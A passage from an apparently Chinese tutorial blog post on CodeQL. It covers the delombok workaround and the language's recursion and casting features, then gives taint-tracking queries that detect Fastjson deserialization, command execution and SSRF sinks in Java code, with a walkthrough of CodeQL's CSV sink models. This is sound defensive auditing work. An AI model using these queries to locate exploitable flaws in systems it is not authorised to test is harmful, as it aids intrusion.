class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;<span class="name">execution</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>test-delombok<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">phase</span>&gt;</span>generate-test-sources<span class="tag">&lt;/<span class="name">phase</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testDelombok<span class="tag">&lt;/<span class="name">goal</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span>  </span><br><span class="line">               <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/test/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span>  </span><br><span class="line">         <span class="tag">&lt;/<span class="name">execution</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">executions</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span>  </span><br><span class="line">   <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><h4 id="解决办法-②"><a href="#解决办法-②" class="headerlink" title="解决办法 ②"></a>解决办法 ②</h4><p>CodeQL官方的issue里面，有人给出了这个问题的解决办法 <a class="link" href="https://github.com/github/codeql/issues/4984">https://github.com/github/codeql/issues/4984<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get a copy of lombok.jar</span></span><br><span class="line">wget https://projectlombok.org/downloads/lombok.jar -O <span class="string">&quot;lombok.jar&quot;</span></span><br><span class="line"><span class="comment"># run &quot;delombok&quot; on the source files and write the generated files to a folder named &quot;delombok&quot;</span></span><br><span class="line">java -jar <span class="string">&quot;lombok.jar&quot;</span> delombok -n --onlyChanged . -d <span class="string">&quot;delombok&quot;</span></span><br><span class="line"><span class="comment"># remove &quot;generated by&quot; comments</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/Generated by delombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># remove any left-over import statements</span></span><br><span class="line">find <span class="string">&quot;delombok&quot;</span> -name <span class="string">&#x27;*.java&#x27;</span> -<span class="built_in">exec</span> sed <span class="string">&#x27;/import lombok/d&#x27;</span> -i <span class="string">&#x27;&#123;&#125;&#x27;</span> <span class="string">&#x27;;&#x27;</span></span><br><span class="line"><span class="comment"># copy delombok&#x27;d files over the original ones</span></span><br><span class="line"><span class="built_in">cp</span> -r <span class="string">&quot;delombok/.&quot;</span> <span class="string">&quot;./&quot;</span></span><br><span class="line"><span class="comment"># remove the &quot;delombok&quot; folder</span></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="string">&quot;delombok&quot;</span></span><br></pre></td></tr></table></figure><p>没有特别明白这个应该在哪个目录下执行命令。</p><p>上面的代码，实现的功能是：去掉代码里的lombok注解，并还原setter和getter方法的java代码，从而使CodeQL的Flow流能够顺利走下去，<br>从而检索到安全漏洞。</p><h3 id="持续工程化"><a href="#持续工程化" class="headerlink" title="持续工程化"></a>持续工程化</h3><p>到此为止，我们编写了SQL注入的查询语句，消除了误报和漏报问题。当前的规则已经能够适应micro-service-seclab项目啦。</p><p>因为我们的micro-service-seclab项目，是按照标准生成的微服务结构，那么我们可以使用这个ql规则去跑其他的项目，来自动化检测其它项目，从而做到自动化检测，提高安全检测效率。</p><p>CodeQL除了提供VSCode的检测插件，也提供了大量的命令行，来实现项目的集成检测。</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create E:\Coding\CodeQL\CodeQL-Practice\database --language=<span class="string">&quot;java&quot;</span> --source-root=E:\Coding\CodeQL\micro_service_seclab --<span class="built_in">command</span>=<span class="string">&quot;mvn clean package -Dmaven.test.skip=true&quot;</span></span><br></pre></td></tr></table></figure><p>我们通过上面语句自动生成 codeql 的中间数据库(database)</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SolvedLombok.png" class><p>这里是很容易踩坑的，因为前面的语句有个问题就是 select 的返回值并非是 string，所以就会报错，报错信息如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error was: Expected result pattern(s) are not present <span class="keyword">for</span> problem query: Expected exactly one pattern. </span><br></pre></td></tr></table></figure><p>参考 <a class="link" href="https://xz.aliyun.com/t/10852#toc-7">https://xz.aliyun.com/t/10852#toc-7<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x04-CodeQL-进阶"><a href="#0x04-CodeQL-进阶" class="headerlink" title="0x04 CodeQL 进阶"></a>0x04 CodeQL 进阶</h2><h3 id="用-instanceof-替代复杂查询语句问题"><a href="#用-instanceof-替代复杂查询语句问题" class="headerlink" title="用 instanceof 替代复杂查询语句问题"></a>用 instanceof 替代复杂查询语句问题</h3><p>我们在上面的案例当中看到了 <code>instanceof</code>, 如果我们去看ql自带的规则库，会发现大量的 <code>instanceof</code> 语句。</p><p><code>instanceof</code> 这个关键字是用来判断当前的对象，和后面的是否为同一类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/instanceof.png" class><p><code>instanceof</code> 是用来优化代码结构非常好的语法糖。</p><p>这种方式的提出其实是用来优化之前使用 <code>exists(|)</code> 匹配对应 Source&#x2F;Sink，如果我们需要写非常多的 <code>exists(|)</code>，这会使得整个项目维护起来非常困难，于是就出现了这一种语法糖 <code>instanceof</code></p><p><code>instanceof</code> 给我们提供了一种机制，我们只需要定义一个 <code>abstract class</code>，比如这个案例当中的 <strong>RemoteFlowSource</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow source of remote user input. */</span><br><span class="line">abstract class RemoteFlowSource extends DataFlow::Node &#123;</span><br><span class="line">  /** Gets a string that describes the type of this remote flow source. */</span><br><span class="line">  abstract string getSourceType();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>isSource</code> 方法里进行 <code>instanceof</code>，判断 src 是 RemoteFlowSource 类型就可以了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>学过 java 的人可能会很费解，我们继承了一个 abstract 抽象类，连个实现方法都没有，怎么就能够达到获取各种 source 的目的呢？</p><p>CodeQL 和 Java 不太一样，只要我们的子类继承了这个 RemoteFlowSource 类，那么所有子类就会被调用，它所代表的 source 也会被加载（让我想起了超级版 Fastjson，这有没有存在 CodeQL 反制一说</p><p>我们在 RemoteFlowSource 定义下面会看到非常多子类，就是这个道理，它们的结果都会被用 and 串联加载。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/autoUsed.png" class><h3 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h3><p>简单来说，有如此一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.l4yn3.microserviceseclab.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们想要根据 <code>innerTwo</code> 类定位到最外层的 <code>StudentService</code> 类，怎么实现？</p><p>按照非递归的写法，我们可以这样做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们通过连续 2 次调用 <code>getEnclosingType()</code> 方法是能够拿到最外层的 StudentService 的。</p><p>但是正如我们所说，实际情况是我们并不清楚一共有多少层嵌套，而且多个文件可能每个的嵌套数量都不一样，我们没法用确定的调用次数来解决此问题，这个时候我们就需要使用递归的方式解决。</p><p>我们在调用方法后面加 <code>*</code> (从本身开始调用)或者 <code>+</code> (从上一级开始调用)，来解决此问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+() // getEnclosingType 获取作用域</span><br></pre></td></tr></table></figure><p>我们也可以自己封装方法来递归调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SelfDefineRecursion.png" class><h3 id="强制类型转换问题（过滤需要类型）"><a href="#强制类型转换问题（过滤需要类型）" class="headerlink" title="强制类型转换问题（过滤需要类型）"></a>强制类型转换问题（过滤需要类型）</h3><p>强制类型转换这个名字有点拗口，且不太好理解，这里我更愿意把它理解成一种 filter</p><p>在 CodeQL 的规则集里，我们会看到很多类型转换的代码，比如：</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefType.png" class><p>我们用如下 QL 语句做个测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>以上代码的含义是打印所有方法参数的名称和类型。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getTypes.png" class><p>如果其中我们想要单独某个类型的方法参数，这里就需要用到强制类型转换，或者说用到 filter</p><p>使用 <code>RefType()</code> 来测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>强制转换成 <code>RefType</code>，意思就是从前面的结果当中过滤出 <code>RefType</code> 类型的参数。</p><p><code>RefType</code> 是什么？引用类型，说白了就是去掉int等基础类型之后的数据。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RefTypeUse.png" class><p>同理这里肯定并不限于 RefType，也可以是其他的。比如这里保留所有的数值类型参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/IntType.png" class><h2 id="0x05-关于其他漏洞点的-CodeQL-语句尝试"><a href="#0x05-关于其他漏洞点的-CodeQL-语句尝试" class="headerlink" title="0x05 关于其他漏洞点的 CodeQL 语句尝试"></a>0x05 关于其他漏洞点的 CodeQL 语句尝试</h2><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p>依样画葫芦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name fastjson-vul</span><br><span class="line"> * @description fastjson-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class FastjsonVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    FastjsonVulConfig() &#123; this = &quot;fastjson&quot; &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call|</span><br><span class="line">            method.hasName(&quot;parseObject&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">            )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from FastjsonVulConfig fastjsonVul, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where fastjsonVul.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/fastjsonVul.png" class><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>写了我一会儿，经过查阅资料发现有直接现成的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"> class RceVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     RceVulConfig() &#123; this = &quot;RceVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink.asExpr() instanceof ArgumentToExec</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from RceVulConfig rceVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where rceVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h3 id="SSRF（重点关注）"><a href="#SSRF（重点关注）" class="headerlink" title="SSRF（重点关注）"></a>SSRF（重点关注）</h3><p>这里的内容主要是参考于这篇文章 <a class="link" href="https://forum.butian.net/share/2117">https://forum.butian.net/share/2117<i class="fas fa-external-link-alt"></i></a></p><p>还是觉得关于 SSRF 的 ql 规则这块儿，应该再记录一下，其实在之前看命令执行的 sink 的时候就没追踪到，但是那个时候并没有深入去看。</p><p>最开始我的 ql 语句是这样的<del>（很嫩的 ql 语句）</del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">         exists(Method method, MethodAccess call|</span><br><span class="line">             method.hasName(&quot;openConnection&quot;)</span><br><span class="line">             and</span><br><span class="line">             call.getMethod() = method and</span><br><span class="line">             sink.asExpr() = call.getArgument(0)</span><br><span class="line">             )</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>追踪 <code>url.openConnection()</code>，但这很明显是追踪不到的，因为 <code>url.openConnection()</code> 是不传参的。那么这一条链路用图来表示的话，断在了这里</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/brokenSSRF.png" class><p>那么中间断的地方我们要想办法接上，这就回到了前文提到过的 <code>isAdditionalTaintStep</code> 方法。从应用角度来说代码应该如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name processBuilder-vul</span><br><span class="line"> * @description processBuilder-vul</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"> import java</span><br><span class="line"> import semmle.code.java.dataflow.FlowSources</span><br><span class="line"> import semmle.code.java.security.QueryInjection</span><br><span class="line"> import DataFlow::PathGraph</span><br><span class="line"> import semmle.code.java.security.RequestForgeryConfig</span><br><span class="line"> </span><br><span class="line"> class SSRFVulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    SSRFVulConfig() &#123; this = &quot;SSRFVulConfig&quot; &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">         src instanceof RemoteFlowSource</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        sink instanceof RequestForgerySink</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> from SSRFVulConfig ssrfVulConfig, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"> where ssrfVulConfig.hasFlowPath(source, sink)</span><br><span class="line"> select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>运行结果</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/SSRFResult.png" class><p>此处 import 了一个新的文件 <code>semmle.code.java.security.RequestForgeryConfig</code>，这里匹配了对应的规则，和之前的命令执行接口是一样的。可以深入看一下对应的实现。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ssrfSinkRealize.png" class><h4 id="isSource"><a href="#isSource" class="headerlink" title="isSource"></a>isSource</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source instanceof RemoteFlowSource and</span><br><span class="line">    // Exclude results of remote HTTP requests: fetching something else based on that result</span><br><span class="line">    // is no worse than following a redirect returned by the remote server, and typically</span><br><span class="line">    // we&#x27;re requesting a resource via https which we trust to only send us to safe URLs.</span><br><span class="line">    not source.asExpr().(MethodAccess).getCallee() instanceof UrlConnectionGetInputStreamMethod</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>RequestForgeryConfig.qll</code> 规则中的 Source 匹配 <code>RemoteFlowSource</code>，且限定了 <code>java.net.URLConnection.getInputStream()</code> 的输入不为漏洞。</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/NotTypeUrlConnection.png" class><p>这里的原因是此处的 <code>getInputStream()</code> 的输入不一定是可控的。</p><h4 id="isSink"><a href="#isSink" class="headerlink" title="isSink"></a>isSink</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123; sink instanceof RequestForgerySink &#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>RequestForgerySink</code></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/RequestForgerySink.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/** A data flow sink for server-side request forgery (SSRF) vulnerabilities. */</span><br><span class="line">abstract class RequestForgerySink extends DataFlow::Node &#123; &#125;</span><br><span class="line"></span><br><span class="line">private class UrlOpenSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  UrlOpenSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;open-url&quot;) &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private class JdbcUrlSinkAsRequestForgerySink extends RequestForgerySink &#123;</span><br><span class="line">  JdbcUrlSinkAsRequestForgerySink() &#123; sinkNode(this, &quot;jdbc-url&quot;) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个类都在构造函数里面调用了 <code>sinkNode()</code>，跟进去，对应的文件是 <code>java.dataflow.ExternalFlow.qll</code>。<br>关注到它的注释内容大致意思是在说</p><p><strong>仅供内部使用。这是一个实验API<br>提供用于处理指定的流模型的类和谓词<br>数据扩展和CSV格式</strong></p><p>那么这里的内容，一定是从某个 CSV 文件里面去读取的，这就被定义为 <code>ModelCsv</code> 我们可以简化代码定义 sink、source、flow step，并通过<code>kind</code>来使用它。</p><ul><li>它的格式有这么几种</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Source: (SourceModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Sink: (SinkModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; kind; provenance</span><br><span class="line"></span><br><span class="line">Summaries: (SummaryModelCsv)</span><br><span class="line">package; type; subtypes; name; signature; ext; input; output; kind; provenance</span><br><span class="line"></span><br><span class="line">Neutrals:</span><br><span class="line">package; type; name; signature; provenan</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ExternalFlowDescription.png" class><p>每一个参数都代表一个含义，整体来说如下</p><p>package：包名<br>type：选择包中的某个类型<br>subtypes：布尔类型，指示是否跳转到子类<br>name：方法名<br>signature：签名<br>ext：类似于附加类<br>input：输入的位置<br>kind：当前 sink 的类型<br>provenance：来源验证</p><p>这么看的话比较抽象，下文会详细讲解 SSRF 漏洞中所对应的规则。</p><p>目前 CodeQL 官方还并未发布 SinkModelCsv 的一些官方规则，原因是此功能尚不稳定。使用需要开发者&#x2F;安全人员自己定义类，此类需继承 <code>xxxModelCsv</code> 即可应用。</p><p>sinkModelCsv 谓词数据如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 